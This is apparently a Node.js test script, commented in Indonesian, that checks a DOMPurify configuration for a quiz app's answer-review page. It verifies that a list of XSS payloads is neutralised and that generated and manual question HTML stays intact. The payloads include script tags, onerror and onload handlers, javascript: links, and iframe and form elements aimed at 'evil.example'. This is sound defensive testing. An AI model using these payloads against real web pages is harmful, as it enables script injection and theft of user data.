// Uji sanitasi HTML (DOMPurify) yang dipakai di halaman tinjau jawaban: payload XSS harus hilang, soal asli harus utuh.
// Jalankan: node scripts/uji-sanitasi.mjs   (butuh devDependency jsdom). Konfigurasi harus sama dengan bersih() di app/page.jsx.
import { JSDOM } from "jsdom";
import createDOMPurify from "dompurify";
import { createRequire } from "node:module";
import path from "node:path";
import { fileURLToPath } from "node:url";
const akar = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const require = createRequire(import.meta.url);
const GEN = require(path.join(akar, "gen.js"));
const win = new JSDOM("").window;
const DOMPurify = createDOMPurify(win);
// SAMA PERSIS dengan page.jsx
const bersih = (h) => DOMPurify.sanitize(String(h), {
  USE_PROFILES: { html: true, svg: true },
  FORBID_TAGS: ["form", "input", "button", "textarea", "select", "option", "label", "style", "link", "meta", "base", "iframe", "object", "embed", "a", "img", "video", "audio", "source"],
  FORBID_ATTR: ["action", "formaction", "srcset", "href", "xlink:href"],
});

// 1) payload serangan harus dinetralkan
const serangan = [
  '<img src=x onerror="fetch(\'/api/master/users\')">',
  '<script>alert(1)</script>',
  '<svg onload="alert(1)"><circle r="5"/></svg>',
  '<a href="javascript:alert(1)">klik</a>',
  '<iframe src="https://evil.example"></iframe>',
  '<svg><script>alert(1)</script></svg>',
  '<div style="position:fixed;inset:0" onclick="x()">x</div>',
  '<form action="https://evil.example"><input name=pw></form>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<object data="x"></object><embed src="x">',
];
let gagal = 0;
for (const a of serangan) {
  const h = bersih(a);
  const bahaya = /<script|onerror|onload|onclick|javascript:|<iframe|<object|<embed|<form|<input|<a /i.test(h);
  if (bahaya) { gagal++; console.log("GAGAL", JSON.stringify(a), "->", JSON.stringify(h)); }
}
console.log(gagal ? "ADA SERANGAN LOLOS" : `OK    ${serangan.length} payload XSS dinetralkan`);

// 2) soal asli dari generator harus tetap utuh (tag, atribut SVG, tabel, gaya)
const dok = new JSDOM("").window.document;
const norm = (h) => { const t = dok.createElement("div"); t.innerHTML = h; return t.innerHTML; };
let rusak = 0, total = 0;
const topik = ["Numerik", "Matematika", "Logika", "Figural", "Verbal", "Grammar", "Bahasa Indonesia", "Akuntansi", "Keuangan", "Karakter Hilang", "Pasangan Sama", "Satu Berbeda", "Hitung Berderet", "Klasifikasi Kata", "Sistem Komputer", "Jaringan & Keamanan", "Pemrograman & Algoritma", "Basis Data", "Matriks & Pola"];
for (const t of topik) for (let l = 1; l <= 3; l++) for (let i = 0; i < 25; i++) {
  const s = GEN.buat(t, l);
  for (const h of [s.q, ...s.opts, s.bahas]) {
    total++;
    if (norm(bersih(h)) !== norm(h)) { rusak++; if (rusak <= 5) console.log("BERUBAH", t, l, "\n  asli:", norm(h).slice(0, 200), "\n  bersih:", bersih(h).slice(0, 200)); }
  }
}
console.log(rusak ? `ADA ${rusak}/${total} potongan HTML berubah oleh sanitasi` : `OK    ${total} potongan HTML soal asli tidak berubah oleh sanitasi`);
// 3) seluruh bank soal manual juga harus lolos sanitasi tanpa berubah
import fs from "node:fs";
import vm from "node:vm";
const sb = { window: {} }; vm.createContext(sb);
for (const f of fs.readdirSync(path.join(akar, "bank"))) vm.runInContext(fs.readFileSync(path.join(akar, "bank", f), "utf8"), sb);
let rb = 0, tb = 0;
for (const list of Object.values(sb.window.BANK)) for (const s of list) for (const h of [s.q, ...s.opts, s.bahas]) { tb++; if (norm(bersih(h)) !== norm(h)) { rb++; if (rb <= 3) console.log("BANK BERUBAH", s.id, norm(h).slice(0, 120)); } }
console.log(rb ? `ADA ${rb}/${tb} potongan bank berubah` : `OK    ${tb} potongan HTML bank manual tidak berubah oleh sanitasi`);
process.exit(gagal || rusak || rb ? 1 : 0);
